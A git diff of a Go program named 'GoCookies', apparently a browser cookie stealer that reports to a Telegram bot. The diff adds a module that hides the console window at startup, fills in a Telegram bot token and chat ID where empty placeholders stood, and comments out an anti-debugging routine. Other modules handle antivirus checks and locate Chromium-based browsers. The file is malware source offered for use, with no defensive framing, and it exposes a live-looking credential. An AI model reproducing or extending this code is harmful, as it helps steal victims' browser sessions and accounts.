@@ -5,6 +5,7 @@ import (
 	// "GoCookies/modules/antidebug"
 	"GoCookies/modules/antivirus"
 	"GoCookies/modules/browsers"
+	"GoCookies/modules/hideconsole"
 	"bytes"
 	"encoding/json"
 	"fmt"
@@ -21,19 +22,25 @@ import (
 )
 
 const (
-	botToken = "" // Replace with your Telegram bot token
-	chatID   = "" // Replace with your Telegram chat ID
+	botToken = "7004913327:AAHl-xuHq37XEnb3E8tDpOjP3ZAaiHv0y0c" // Replace with your Telegram bot token
+	chatID   = "928268791" // Replace with your Telegram chat ID
 )
 
 func main() {
-	// Anti-debugging check at the start
+	// Hide-console check at the start
+	fmt.Println("Running antivirus logic")
+	go hideconsole.Run()
+	fmt.Println("Completed antivirus logic")
+	
+	// Anti-virus check at the start
 	fmt.Println("Running antivirus logic")
 	go antivirus.Run()
 	fmt.Println("Completed antivirus logic")
 
-	fmt.Println("Running antidebug logic")
+	// Anti-debugging check at the start
+	// fmt.Println("Running antidebug logic")
 	// go antidebug.Run()
-	fmt.Println("Completed antidebug logic")
+	// fmt.Println("Completed antidebug logic")
 
 
 	// Get the available Chromium-based browsers and their paths
